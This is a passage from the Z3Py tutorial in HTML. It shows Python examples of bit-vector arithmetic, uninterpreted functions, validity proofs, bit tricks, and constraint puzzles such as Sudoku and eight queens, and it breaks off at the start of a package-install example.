<span>b</span> <span>=</span> <span>BitVecVal</span><span>(</span><span>65535</span><span>,</span> <span>32</span><span>)</span>
<span># -1 is not equal to 65535 for 32-bit integers </span>
<span>print</span> (<span>simplify</span><span>(</span><span>a</span> <span>==</span> <span>b</span><span>)</span>)
</pre></div>
</example>

<p>
In contrast to programming languages, such as C, C++, C#, Java,
there is no distinction between signed and unsigned bit-vectors
as numbers. Instead, Z3 provides special signed versions of arithmetical operations
where it makes a difference whether the bit-vector is treated as signed or unsigned.
In Z3Py, the operators
<tt>&lt;</tt>,
<tt>&lt;=</tt>,
<tt>&gt;</tt>,
<tt>&gt;=</tt>, <tt>/</tt>, <tt>%</tt> and <tt>&gt;&gt;</tt> correspond to the signed versions.
The corresponding unsigned operators are
<tt>ULT</tt>,
<tt>ULE</tt>,
<tt>UGT</tt>,
<tt>UGE</tt>, <tt>UDiv</tt>, <tt>URem</tt> and <tt>LShR</tt>.
</p>

<example pref="bitvec.2">
<div><pre><span># Create to bit-vectors of size 32</span>
<span>x</span><span>,</span> <span>y</span> <span>=</span> <span>BitVecs</span><span>(</span><span>'x y'</span><span>,</span> <span>32</span><span>)</span>

<span>solve</span><span>(</span><span>x</span> <span>+</span> <span>y</span> <span>==</span> <span>2</span><span>,</span> <span>x</span> <span>&gt;</span> <span>0</span><span>,</span> <span>y</span> <span>&gt;</span> <span>0</span><span>)</span>

<span># Bit-wise operators</span>
<span># &amp; bit-wise and</span>
<span># | bit-wise or</span>
<span># ~ bit-wise not</span>
<span>solve</span><span>(</span><span>x</span> <span>&amp;</span> <span>y</span> <span>==</span> <span>~</span><span>y</span><span>)</span>

<span>solve</span><span>(</span><span>x</span> <span>&lt;</span> <span>0</span><span>)</span>

<span># using unsigned version of &lt; </span>
<span>solve</span><span>(</span><span>ULT</span><span>(</span><span>x</span><span>,</span> <span>0</span><span>))</span>
</pre></div>
</example>

<p>
The operator <tt>&gt;&gt;</tt> is the arithmetic shift right, and
<tt>&lt;&lt;</tt> is the shift left. The logical shift right is the operator <tt>LShR</tt>.
</p>

<example pref="bitvec.3">
<div><pre><span># Create to bit-vectors of size 32</span>
<span>x</span><span>,</span> <span>y</span> <span>=</span> <span>BitVecs</span><span>(</span><span>'x y'</span><span>,</span> <span>32</span><span>)</span>

<span>solve</span><span>(</span><span>x</span> <span>&gt;&gt;</span> <span>2</span> <span>==</span> <span>3</span><span>)</span>

<span>solve</span><span>(</span><span>x</span> <span>&lt;&lt;</span> <span>2</span> <span>==</span> <span>3</span><span>)</span>

<span>solve</span><span>(</span><span>x</span> <span>&lt;&lt;</span> <span>2</span> <span>==</span> <span>24</span><span>)</span>
</pre></div>
</example>

<h2>Functions</h2>

<p>
Unlike programming languages, where functions have side-effects, can throw exceptions,
or never return, functions in Z3 have no side-effects and are <b>total</b>.
That is, they are defined on all input values. This includes functions, such
as division. Z3 is based on <a target="_blank" href="http://en.wikipedia.org/wiki/First-order_logic">first-order logic</a>.
</p>

<p>
Given a constraints such as <tt>x + y &gt; 3</tt>, we have been saying that <tt>x</tt> and <tt>y</tt>
are variables. In many textbooks, <tt>x</tt> and <tt>y</tt> are called uninterpreted constants.
That is, they allow any interpretation that is consistent with the constraint <tt>x + y &gt; 3</tt>.
</p>

<p>
More precisely, function and constant symbols in pure first-order logic are <i>uninterpreted</i> or <i>free</i>,
which means that no a priori interpretation is attached.
This is in contrast to functions belonging to the signature of theories,
such as arithmetic where the function <tt>+</tt> has a fixed standard interpretation
(it adds two numbers). Uninterpreted functions and constants are maximally flexible;
they allow any interpretation that is consistent with the constraints over the function or constant.
</p>

<p>
To illustrate uninterpreted functions and constants let us the uninterpreted integer constants (aka variables)
<tt>x</tt>, <tt>y</tt>. Finally let <tt>f</tt> be an uninterpreted function that takes one argument of type (aka sort) integer
and results in an integer value.
The example illustrates how one can force an interpretation where <tt>f</tt>
applied twice to <tt>x</tt> results in <tt>x</tt> again, but <tt>f</tt> applied once to <tt>x</tt> is different from <tt>x</tt>.
</p>

<example pref="z3py.14">
<div><pre><span>x</span> <span>=</span> <span>Int</span><span>(</span><span>'x'</span><span>)</span>
<span>y</span> <span>=</span> <span>Int</span><span>(</span><span>'y'</span><span>)</span>
<span>f</span> <span>=</span> <span>Function</span><span>(</span><span>'f'</span><span>,</span> <span>IntSort</span><span>(),</span> <span>IntSort</span><span>())</span>
<span>solve</span><span>(</span><span>f</span><span>(</span><span>f</span><span>(</span><span>x</span><span>))</span> <span>==</span> <span>x</span><span>,</span> <span>f</span><span>(</span><span>x</span><span>)</span> <span>==</span> <span>y</span><span>,</span> <span>x</span> <span>!=</span> <span>y</span><span>)</span>
</pre></div>
</example>

<p>The solution (interpretation) for <tt>f</tt> should be read as <tt>f(0)</tt> is <tt>1</tt>, <tt>f(1)</tt> is <tt>0</tt>, and <tt>f(a)</tt>
is <tt>1</tt> for all <tt>a</tt> different from <tt>0</tt> and <tt>1</tt>.
</p>

<p>In Z3, we can also evaluate expressions in the model for a system of constraints. The following example shows how to
use the <tt>evaluate</tt> method.</p>

<example pref="z3py.15">
<div><pre><span>x</span> <span>=</span> <span>Int</span><span>(</span><span>'x'</span><span>)</span>
<span>y</span> <span>=</span> <span>Int</span><span>(</span><span>'y'</span><span>)</span>
<span>f</span> <span>=</span> <span>Function</span><span>(</span><span>'f'</span><span>,</span> <span>IntSort</span><span>(),</span> <span>IntSort</span><span>())</span>
<span>s</span> <span>=</span> <span>Solver</span><span>()</span>
<span>s</span><span>.</span><span>add</span><span>(</span><span>f</span><span>(</span><span>f</span><span>(</span><span>x</span><span>))</span> <span>==</span> <span>x</span><span>,</span> <span>f</span><span>(</span><span>x</span><span>)</span> <span>==</span> <span>y</span><span>,</span> <span>x</span> <span>!=</span> <span>y</span><span>)</span>
<span>print</span> (<span>s</span><span>.</span><span>check</span><span>()</span>)
<span>m</span> <span>=</span> <span>s</span><span>.</span><span>model</span><span>()</span>
<span>print</span> (<span>"f(f(x)) ="</span><span>,</span> <span>m</span><span>.</span><span>evaluate</span><span>(</span><span>f</span><span>(</span><span>f</span><span>(</span><span>x</span><span>)))</span>)
<span>print</span> (<span>"f(x)    ="</span><span>,</span> <span>m</span><span>.</span><span>evaluate</span><span>(</span><span>f</span><span>(</span><span>x</span><span>))</span>)
</pre></div>
</example>

<h2>Satisfiability and Validity</h2>

<p>A formula/constraint <tt>F</tt> is <b>valid</b> if <tt>F</tt> always evaluates to true for any assignment of appropriate values to its
uninterpreted symbols.
A formula/constraint <tt>F</tt> is <b>satisfiable</b> if there is some assignment of appropriate values
to its uninterpreted  symbols under which <tt>F</tt> evaluates to true.
Validity is about finding a proof of a statement; satisfiability is about finding a solution to a set of constraints.
Consider a formula <tt>F</tt> containing <tt>a</tt> and <tt>b</tt>.
We can ask whether <tt>F</tt> is valid, that is whether it is always true for any combination of values for
<tt>a</tt> and <tt>b</tt>. If <tt>F</tt> is always
true, then <tt>Not(F)</tt> is always false, and then <tt>Not(F)</tt> will not have any satisfying assignment (i.e., solution); that is,
<tt>Not(F)</tt> is unsatisfiable. That is,
<tt>F</tt> is valid precisely when <tt>Not(F)</tt> is not satisfiable (is unsatisfiable).
Alternately,
<tt>F</tt> is satisfiable if and only if <tt>Not(F)</tt> is not valid (is invalid).
The following example proves the deMorgan's law.
</p>

<p>The following example redefines the Z3Py function <tt>prove</tt> that receives a formula as a parameter.
This function creates a solver, adds/asserts the negation of the formula, and check if the negation is unsatisfiable.
The implementation of this function is a simpler version of the Z3Py command <tt>prove</tt>.
</p>

<example pref="z3py.16">
<div><pre><span>p</span><span>,</span> <span>q</span> <span>=</span> <span>Bools</span><span>(</span><span>'p q'</span><span>)</span>
<span>demorgan</span> <span>=</span> <span>And</span><span>(</span><span>p</span><span>,</span> <span>q</span><span>)</span> <span>==</span> <span>Not</span><span>(</span><span>Or</span><span>(</span><span>Not</span><span>(</span><span>p</span><span>),</span> <span>Not</span><span>(</span><span>q</span><span>)))</span>
<span>print</span> (<span>demorgan</span>)

<span>def</span> <span>prove</span><span>(</span><span>f</span><span>):</span>
    <span>s</span> <span>=</span> <span>Solver</span><span>()</span>
    <span>s</span><span>.</span><span>add</span><span>(</span><span>Not</span><span>(</span><span>f</span><span>))</span>
    <span>if</span> <span>s</span><span>.</span><span>check</span><span>()</span> <span>==</span> <span>unsat</span><span>:</span>
        <span>print</span> (<span>"proved"</span>)
    <span>else</span><span>:</span>
        <span>print</span> (<span>"failed to prove"</span>)

<span>print</span> (<span>"Proving demorgan..."</span>)
<span>prove</span><span>(</span><span>demorgan</span><span>)</span>
</pre></div>
</example>

<h2>List Comprehensions</h2>

<p>
Python supports <a target="_blank" href="http://docs.python.org/tutorial/datastructures.html#list-comprehensions">list comprehensions</a>.
List comprehensions provide a concise way to create lists. They can be used to create Z3 expressions and problems in Z3Py.
The following example demonstrates how to use Python list comprehensions in Z3Py.
</p>

<example pref="list.1">
<div><pre><span># Create list [1, ..., 5] </span>
<span>print</span> (<span>[</span> <span>x</span> <span>+</span> <span>1</span> <span>for</span> <span>x</span> <span>in</span> <span>range</span><span>(</span><span>5</span><span>)</span> <span>]</span>)

<span># Create two lists containing 5 integer variables</span>
<span>X</span> <span>=</span> <span>[</span> <span>Int</span><span>(</span><span>'x</span><span>%s</span><span>'</span> <span>%</span> <span>i</span><span>)</span> <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>5</span><span>)</span> <span>]</span>
<span>Y</span> <span>=</span> <span>[</span> <span>Int</span><span>(</span><span>'y</span><span>%s</span><span>'</span> <span>%</span> <span>i</span><span>)</span> <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>5</span><span>)</span> <span>]</span>
<span>print</span> (<span>X</span>)

<span># Create a list containing X[i]+Y[i]</span>
<span>X_plus_Y</span> <span>=</span> <span>[</span> <span>X</span><span>[</span><span>i</span><span>]</span> <span>+</span> <span>Y</span><span>[</span><span>i</span><span>]</span> <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>5</span><span>)</span> <span>]</span>
<span>print</span> (<span>X_plus_Y</span>)

<span># Create a list containing X[i] &gt; Y[i]</span>
<span>X_gt_Y</span> <span>=</span> <span>[</span> <span>X</span><span>[</span><span>i</span><span>]</span> <span>&gt;</span> <span>Y</span><span>[</span><span>i</span><span>]</span> <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>5</span><span>)</span> <span>]</span>
<span>print</span> (<span>X_gt_Y</span>)

<span>print</span> (<span>And</span><span>(</span><span>X_gt_Y</span><span>)</span>)

<span># Create a 3x3 "matrix" (list of lists) of integer variables</span>
<span>X</span> <span>=</span> <span>[</span> <span>[</span> <span>Int</span><span>(</span><span>"x_</span><span>%s</span><span>_</span><span>%s</span><span>"</span> <span>%</span> <span>(</span><span>i</span><span>+</span><span>1</span><span>,</span> <span>j</span><span>+</span><span>1</span><span>))</span> <span>for</span> <span>j</span> <span>in</span> <span>range</span><span>(</span><span>3</span><span>)</span> <span>]</span>
      <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>3</span><span>)</span> <span>]</span>
<span>pp</span><span>(</span><span>X</span><span>)</span>
</pre></div>
</example>

<p>In the example above, the expression <tt>"x%s" % i</tt> returns a string where <tt>%s</tt> is replaced with the value of <tt>i</tt>.</p>

<p>The command <tt>pp</tt> is similar to <tt>print</tt>, but it uses Z3Py formatter for lists and tuples instead of Python's formatter.</p>

<p>Z3Py also provides functions for creating vectors of Boolean, Integer and Real variables. These functions
are implemented using list comprehensions.
</p>

<example pref="list.2">
<div><pre><span>X</span> <span>=</span> <span>IntVector</span><span>(</span><span>'x'</span><span>,</span> <span>5</span><span>)</span>
<span>Y</span> <span>=</span> <span>RealVector</span><span>(</span><span>'y'</span><span>,</span> <span>5</span><span>)</span>
<span>P</span> <span>=</span> <span>BoolVector</span><span>(</span><span>'p'</span><span>,</span> <span>5</span><span>)</span>
<span>print</span> (<span>X</span>)
<span>print</span> (<span>Y</span>)
<span>print</span> (<span>P</span>)
<span>print</span> (<span>[</span> <span>y</span><span>**</span><span>2</span> <span>for</span> <span>y</span> <span>in</span> <span>Y</span> <span>]</span>)
<span>print</span> (<span>Sum</span><span>([</span> <span>y</span><span>**</span><span>2</span> <span>for</span> <span>y</span> <span>in</span> <span>Y</span> <span>])</span>)
</pre></div>
</example>

<h2>Kinematic Equations</h2>

<p>
In high school, students learn the kinematic equations.
These equations describe the mathematical relationship between <b>displacement</b> (<tt>d</tt>),
<b>time</b> (<tt>t</tt>), <b>acceleration</b> (<tt>a</tt>), <b>initial velocity</b> (<tt>v_i</tt>) and <b>final velocity</b> (<tt>v_f</tt>).
In Z3Py notation, we can write these equations as:
</p>
<pre>   d == v_i * t + (a*t**2)/2,
   v_f == v_i + a*t
</pre>

<h3>Problem 1</h3>

<p>
Ima Hurryin is approaching a stoplight moving with a velocity of <tt>30.0</tt> m/s.
The light turns yellow, and Ima applies the brakes and skids to a stop.
If Ima's acceleration is <tt>-8.00</tt> m/s<sup>2</sup>, then determine the displacement of the
car during the skidding process.
</p>

<example pref="k.1">
<div><pre><span>d</span><span>,</span> <span>a</span><span>,</span> <span>t</span><span>,</span> <span>v_i</span><span>,</span> <span>v_f</span> <span>=</span> <span>Reals</span><span>(</span><span>'d a t v__i v__f'</span><span>)</span>

<span>equations</span> <span>=</span> <span>[</span>
   <span>d</span> <span>==</span> <span>v_i</span> <span>*</span> <span>t</span> <span>+</span> <span>(</span><span>a</span><span>*</span><span>t</span><span>**</span><span>2</span><span>)</span><span>/</span><span>2</span><span>,</span>
   <span>v_f</span> <span>==</span> <span>v_i</span> <span>+</span> <span>a</span><span>*</span><span>t</span><span>,</span>
<span>]</span>
<span>print</span> (<span>"Kinematic equations:"</span>)
<span>print</span> (<span>equations</span>)

<span># Given v_i, v_f and a, find d</span>
<span>problem</span> <span>=</span> <span>[</span>
    <span>v_i</span> <span>==</span> <span>30</span><span>,</span>
    <span>v_f</span> <span>==</span> <span>0</span><span>,</span>
    <span>a</span>   <span>==</span> <span>-</span><span>8</span>
<span>]</span>
<span>print</span> (<span>"Problem:"</span>)
<span>print</span> (<span>problem</span>)

<span>print</span> (<span>"Solution:"</span>)
<span>solve</span><span>(</span><span>equations</span> <span>+</span> <span>problem</span><span>)</span>
</pre></div>
</example>


<h3>Problem 2</h3>

<p>
Ben Rushin is waiting at a stoplight. When it finally turns green, Ben accelerated from rest at a rate of
a <tt>6.00</tt> m/s<sup>2</sup> for a time of <tt>4.10</tt> seconds. Determine the displacement of Ben's car during this time period.
</p>

<example pref="k.2">
<div><pre><span>d</span><span>,</span> <span>a</span><span>,</span> <span>t</span><span>,</span> <span>v_i</span><span>,</span> <span>v_f</span> <span>=</span> <span>Reals</span><span>(</span><span>'d a t v__i v__f'</span><span>)</span>

<span>equations</span> <span>=</span> <span>[</span>
   <span>d</span> <span>==</span> <span>v_i</span> <span>*</span> <span>t</span> <span>+</span> <span>(</span><span>a</span><span>*</span><span>t</span><span>**</span><span>2</span><span>)</span><span>/</span><span>2</span><span>,</span>
   <span>v_f</span> <span>==</span> <span>v_i</span> <span>+</span> <span>a</span><span>*</span><span>t</span><span>,</span>
<span>]</span>

<span># Given v_i, t and a, find d</span>
<span>problem</span> <span>=</span> <span>[</span>
    <span>v_i</span> <span>==</span> <span>0</span><span>,</span>
    <span>t</span>   <span>==</span> <span>4.10</span><span>,</span>
    <span>a</span>   <span>==</span> <span>6</span>
<span>]</span>

<span>solve</span><span>(</span><span>equations</span> <span>+</span> <span>problem</span><span>)</span>

<span># Display rationals in decimal notation</span>
<span>set_option</span><span>(</span><span>rational_to_decimal</span><span>=</span><span>True</span><span>)</span>

<span>solve</span><span>(</span><span>equations</span> <span>+</span> <span>problem</span><span>)</span>
</pre></div>
</example>

<h2>Bit Tricks</h2>

<p>Some low level <a target="_blank" href="http://graphics.stanford.edu/~seander/bithacks.html">hacks</a> are very popular with C programmers.
We use some of these hacks in the Z3 implementation.
</p>

<h3>Power of two</h3>

<p>This hack is frequently used in C programs (Z3 included) to test whether a machine integer is a power of two.
We can use Z3 to prove it really works. The claim is that <tt>x != 0 &amp;&amp; !(x &amp; (x - 1))</tt> is true if and only if <tt>x</tt>
is a power of two.
</p>

<example pref="bit.1">
<div><pre><span>x</span>      <span>=</span> <span>BitVec</span><span>(</span><span>'x'</span><span>,</span> <span>32</span><span>)</span>
<span>powers</span> <span>=</span> <span>[</span> <span>2</span><span>**</span><span>i</span> <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>32</span><span>)</span> <span>]</span>
<span>fast</span>   <span>=</span> <span>And</span><span>(</span><span>x</span> <span>!=</span> <span>0</span><span>,</span> <span>x</span> <span>&amp;</span> <span>(</span><span>x</span> <span>-</span> <span>1</span><span>)</span> <span>==</span> <span>0</span><span>)</span>
<span>slow</span>   <span>=</span> <span>Or</span><span>([</span> <span>x</span> <span>==</span> <span>p</span> <span>for</span> <span>p</span> <span>in</span> <span>powers</span> <span>])</span>
<span>print</span> (<span>fast</span>)
<span>prove</span><span>(</span><span>fast</span> <span>==</span> <span>slow</span><span>)</span>

<span>print</span> (<span>"trying to prove buggy version..."</span>)
<span>fast</span>   <span>=</span> <span>x</span> <span>&amp;</span> <span>(</span><span>x</span> <span>-</span> <span>1</span><span>)</span> <span>==</span> <span>0</span>
<span>prove</span><span>(</span><span>fast</span> <span>==</span> <span>slow</span><span>)</span>
</pre></div>
</example>

<h3>Opposite signs</h3>

<p>The following simple hack can be used to test whether two machine integers have opposite signs.</p>

<example pref="bit.2">
<div><pre><span>x</span>      <span>=</span> <span>BitVec</span><span>(</span><span>'x'</span><span>,</span> <span>32</span><span>)</span>
<span>y</span>      <span>=</span> <span>BitVec</span><span>(</span><span>'y'</span><span>,</span> <span>32</span><span>)</span>

<span># Claim: (x ^ y) &lt; 0 iff x and y have opposite signs</span>
<span>trick</span>  <span>=</span> <span>(</span><span>x</span> <span>^</span> <span>y</span><span>)</span> <span>&lt;</span> <span>0</span>

<span># Naive way to check if x and y have opposite signs</span>
<span>opposite</span> <span>=</span> <span>Or</span><span>(</span><span>And</span><span>(</span><span>x</span> <span>&lt;</span> <span>0</span><span>,</span> <span>y</span> <span>&gt;=</span> <span>0</span><span>),</span>
              <span>And</span><span>(</span><span>x</span> <span>&gt;=</span> <span>0</span><span>,</span> <span>y</span> <span>&lt;</span> <span>0</span><span>))</span>

<span>prove</span><span>(</span><span>trick</span> <span>==</span> <span>opposite</span><span>)</span>
</pre></div>
</example>

<h2>Puzzles</h2>

<h3>Dog, Cat and Mouse</h3>

<p>Consider the following puzzle. Spend exactly 100 dollars and buy exactly 100 animals.
Dogs cost 15 dollars, cats cost 1 dollar, and mice cost 25 cents each.
You have to buy at least one of each.
How many of each should you buy?
</p>

<example pref="puzzle.1">
<div><pre><span># Create 3 integer variables</span>
<span>dog</span><span>,</span> <span>cat</span><span>,</span> <span>mouse</span> <span>=</span> <span>Ints</span><span>(</span><span>'dog cat mouse'</span><span>)</span>
<span>solve</span><span>(</span><span>dog</span> <span>&gt;=</span> <span>1</span><span>,</span>   <span># at least one dog</span>
      <span>cat</span> <span>&gt;=</span> <span>1</span><span>,</span>   <span># at least one cat</span>
      <span>mouse</span> <span>&gt;=</span> <span>1</span><span>,</span> <span># at least one mouse</span>
      <span># we want to buy 100 animals</span>
      <span>dog</span> <span>+</span> <span>cat</span> <span>+</span> <span>mouse</span> <span>==</span> <span>100</span><span>,</span>
      <span># We have 100 dollars (10000 cents):</span>
      <span>#   dogs cost 15 dollars (1500 cents), </span>
      <span>#   cats cost 1 dollar (100 cents), and </span>
      <span>#   mice cost 25 cents </span>
      <span>1500</span> <span>*</span> <span>dog</span> <span>+</span> <span>100</span> <span>*</span> <span>cat</span> <span>+</span> <span>25</span> <span>*</span> <span>mouse</span> <span>==</span> <span>10000</span><span>)</span>
</pre></div>
</example>

<h3>Sudoku</h3>

<p><a target="_blank" href="http://www.dailysudoku.com/sudoku/">Sudoku</a> is a very popular puzzle.
The goal is to insert the numbers in the boxes to satisfy only one condition: each row, column and
<tt>3x3</tt> box must contain the digits <tt>1</tt> through <tt>9</tt> exactly once.
</p>

<img src="https://ericpony.github.io/z3py-tutorial/examples/sudoku.png">

<p>
The following example encodes the sudoku problem in Z3. Different sudoku instances can be solved
by modifying the matrix <tt>instance</tt>. This example makes heavy use of
<a target="_blank" href="http://docs.python.org/tutorial/datastructures.html#list-comprehensions">list comprehensions</a>
available in the Python programming language.
</p>

<example pref="puzzle.2">
<div><pre><span># 9x9 matrix of integer variables</span>
<span>X</span> <span>=</span> <span>[</span> <span>[</span> <span>Int</span><span>(</span><span>"x_</span><span>%s</span><span>_</span><span>%s</span><span>"</span> <span>%</span> <span>(</span><span>i</span><span>+</span><span>1</span><span>,</span> <span>j</span><span>+</span><span>1</span><span>))</span> <span>for</span> <span>j</span> <span>in</span> <span>range</span><span>(</span><span>9</span><span>)</span> <span>]</span>
      <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>9</span><span>)</span> <span>]</span>

<span># each cell contains a value in {1, ..., 9}</span>
<span>cells_c</span>  <span>=</span> <span>[</span> <span>And</span><span>(</span><span>1</span> <span>&lt;=</span> <span>X</span><span>[</span><span>i</span><span>][</span><span>j</span><span>],</span> <span>X</span><span>[</span><span>i</span><span>][</span><span>j</span><span>]</span> <span>&lt;=</span> <span>9</span><span>)</span>
             <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>9</span><span>)</span> <span>for</span> <span>j</span> <span>in</span> <span>range</span><span>(</span><span>9</span><span>)</span> <span>]</span>

<span># each row contains a digit at most once</span>
<span>rows_c</span>   <span>=</span> <span>[</span> <span>Distinct</span><span>(</span><span>X</span><span>[</span><span>i</span><span>])</span> <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>9</span><span>)</span> <span>]</span>

<span># each column contains a digit at most once</span>
<span>cols_c</span>   <span>=</span> <span>[</span> <span>Distinct</span><span>([</span> <span>X</span><span>[</span><span>i</span><span>][</span><span>j</span><span>]</span> <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>9</span><span>)</span> <span>])</span>
             <span>for</span> <span>j</span> <span>in</span> <span>range</span><span>(</span><span>9</span><span>)</span> <span>]</span>

<span># each 3x3 square contains a digit at most once</span>
<span>sq_c</span>     <span>=</span> <span>[</span> <span>Distinct</span><span>([</span> <span>X</span><span>[</span><span>3</span><span>*</span><span>i0</span> <span>+</span> <span>i</span><span>][</span><span>3</span><span>*</span><span>j0</span> <span>+</span> <span>j</span><span>]</span>
                        <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>3</span><span>)</span> <span>for</span> <span>j</span> <span>in</span> <span>range</span><span>(</span><span>3</span><span>)</span> <span>])</span>
             <span>for</span> <span>i0</span> <span>in</span> <span>range</span><span>(</span><span>3</span><span>)</span> <span>for</span> <span>j0</span> <span>in</span> <span>range</span><span>(</span><span>3</span><span>)</span> <span>]</span>

<span>sudoku_c</span> <span>=</span> <span>cells_c</span> <span>+</span> <span>rows_c</span> <span>+</span> <span>cols_c</span> <span>+</span> <span>sq_c</span>

<span># sudoku instance, we use '0' for empty cells</span>
<span>instance</span> <span>=</span> <span>((</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>9</span><span>,</span><span>4</span><span>,</span><span>0</span><span>,</span><span>3</span><span>,</span><span>0</span><span>),</span>
            <span>(</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>5</span><span>,</span><span>1</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>7</span><span>),</span>
            <span>(</span><span>0</span><span>,</span><span>8</span><span>,</span><span>9</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>4</span><span>,</span><span>0</span><span>),</span>
            <span>(</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>2</span><span>,</span><span>0</span><span>,</span><span>8</span><span>),</span>
            <span>(</span><span>0</span><span>,</span><span>6</span><span>,</span><span>0</span><span>,</span><span>2</span><span>,</span><span>0</span><span>,</span><span>1</span><span>,</span><span>0</span><span>,</span><span>5</span><span>,</span><span>0</span><span>),</span>
            <span>(</span><span>1</span><span>,</span><span>0</span><span>,</span><span>2</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>),</span>
            <span>(</span><span>0</span><span>,</span><span>7</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>5</span><span>,</span><span>2</span><span>,</span><span>0</span><span>),</span>
            <span>(</span><span>9</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>6</span><span>,</span><span>5</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>),</span>
            <span>(</span><span>0</span><span>,</span><span>4</span><span>,</span><span>0</span><span>,</span><span>9</span><span>,</span><span>7</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>))</span>

<span>instance_c</span> <span>=</span> <span>[</span> <span>If</span><span>(</span><span>instance</span><span>[</span><span>i</span><span>][</span><span>j</span><span>]</span> <span>==</span> <span>0</span><span>,</span>
                  <span>True</span><span>,</span>
                  <span>X</span><span>[</span><span>i</span><span>][</span><span>j</span><span>]</span> <span>==</span> <span>instance</span><span>[</span><span>i</span><span>][</span><span>j</span><span>])</span>
               <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>9</span><span>)</span> <span>for</span> <span>j</span> <span>in</span> <span>range</span><span>(</span><span>9</span><span>)</span> <span>]</span>

<span>s</span> <span>=</span> <span>Solver</span><span>()</span>
<span>s</span><span>.</span><span>add</span><span>(</span><span>sudoku_c</span> <span>+</span> <span>instance_c</span><span>)</span>
<span>if</span> <span>s</span><span>.</span><span>check</span><span>()</span> <span>==</span> <span>sat</span><span>:</span>
    <span>m</span> <span>=</span> <span>s</span><span>.</span><span>model</span><span>()</span>
    <span>r</span> <span>=</span> <span>[</span> <span>[</span> <span>m</span><span>.</span><span>evaluate</span><span>(</span><span>X</span><span>[</span><span>i</span><span>][</span><span>j</span><span>])</span> <span>for</span> <span>j</span> <span>in</span> <span>range</span><span>(</span><span>9</span><span>)</span> <span>]</span>
          <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>9</span><span>)</span> <span>]</span>
    <span>print_matrix</span><span>(</span><span>r</span><span>)</span>
<span>else</span><span>:</span>
    <span>print</span> (<span>"failed to solve"</span>)
</pre></div>
</example>

<h3>Eight Queens</h3>

<p>
The eight queens puzzle is the problem of placing eight chess queens on an 8x8 chessboard so that no two queens attack each other.
Thus, a solution requires that no two queens share the same row, column, or diagonal.
</p>

<p> <img src="https://ericpony.github.io/z3py-tutorial/examples/queens.png">
</p>

<example pref="puzzle.3">
<div><pre><span># We know each queen must be in a different row.</span>
<span># So, we represent each queen by a single integer: the column position</span>
<span>Q</span> <span>=</span> <span>[</span> <span>Int</span><span>(</span><span>'Q_</span><span>%i</span><span>'</span> <span>%</span> <span>(</span><span>i</span> <span>+</span> <span>1</span><span>))</span> <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>8</span><span>)</span> <span>]</span>

<span># Each queen is in a column {1, ... 8 }</span>
<span>val_c</span> <span>=</span> <span>[</span> <span>And</span><span>(</span><span>1</span> <span>&lt;=</span> <span>Q</span><span>[</span><span>i</span><span>],</span> <span>Q</span><span>[</span><span>i</span><span>]</span> <span>&lt;=</span> <span>8</span><span>)</span> <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>8</span><span>)</span> <span>]</span>

<span># At most one queen per column</span>
<span>col_c</span> <span>=</span> <span>[</span> <span>Distinct</span><span>(</span><span>Q</span><span>)</span> <span>]</span>

<span># Diagonal constraint</span>
<span>diag_c</span> <span>=</span> <span>[</span> <span>If</span><span>(</span><span>i</span> <span>==</span> <span>j</span><span>,</span>
              <span>True</span><span>,</span>
              <span>And</span><span>(</span><span>Q</span><span>[</span><span>i</span><span>]</span> <span>-</span> <span>Q</span><span>[</span><span>j</span><span>]</span> <span>!=</span> <span>i</span> <span>-</span> <span>j</span><span>,</span> <span>Q</span><span>[</span><span>i</span><span>]</span> <span>-</span> <span>Q</span><span>[</span><span>j</span><span>]</span> <span>!=</span> <span>j</span> <span>-</span> <span>i</span><span>))</span>
           <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>8</span><span>)</span> <span>for</span> <span>j</span> <span>in</span> <span>range</span><span>(</span><span>i</span><span>)</span> <span>]</span>

<span>solve</span><span>(</span><span>val_c</span> <span>+</span> <span>col_c</span> <span>+</span> <span>diag_c</span><span>)</span>
</pre></div>
</example>

<h2>Application: Install Problem</h2>

<p>The <b>install problem</b> consists of determining whether a new set of packages can be installed in a system.
This application is based on the article
<a target="_blank" href="http://cseweb.ucsd.edu/~rjhala/papers/opium.pdf">OPIUM: Optimal Package Install/Uninstall Manager</a>.
Many packages depend on other packages to provide some functionality.
Each distribution contains a meta-data file that
explicates the requirements of each package of the distribution.
The meta-data contains details like the name, version, etc. More importantly, it contains
<b>depends</b> and <b>conflicts</b>
clauses that stipulate which other packages should be on the
system. The depends clauses stipulate which other packages must be present.
The conflicts clauses stipulate which other packages must not be present.
</p>

<p>The install problem can be easily solved using Z3. The idea is to define a Boolean variable for each
package. This variable is true if the package must be in the system. If package <tt>a</tt> depends on
